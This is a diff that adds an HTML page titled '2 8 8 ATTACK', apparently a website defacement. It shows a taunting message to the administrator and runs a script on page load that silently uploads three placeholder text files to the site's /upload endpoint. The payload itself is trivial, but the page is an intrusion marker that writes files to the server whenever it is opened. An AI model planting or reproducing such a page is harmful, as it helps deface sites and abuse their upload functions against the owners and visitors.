@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2 8 8 ATTACK</title>
+</head>
+<body>
+  <h1>Check your files admin..2 8 8 was here.</h1>
+  <script>
+    async function uploadFile(filename, content) {
+      const formData = new FormData();
+      formData.append(filename, new Blob([content], { type: 'text/plain' }), filename);
+
+      try {
+        const response = await fetch('/upload', {
+          method: 'POST',
+          body: formData
+        });
+
+        if (response.ok) {
+          console.log(`File ${filename} uploaded successfully.`);
+        } else {
+          console.error(`Failed to upload ${filename}: ${response.statusText}`);
+        }
+      } catch (error) {
+        console.error('Error uploading file:', error);
+      }
+    }
+
+    uploadFile('hello_1.txt', 'Content for hello_1');
+    uploadFile('hello_2.txt', 'Content for hello_2');
+    uploadFile('hello_3.txt', 'Content for hello_3');
+  </script>
+</body>
+</html>
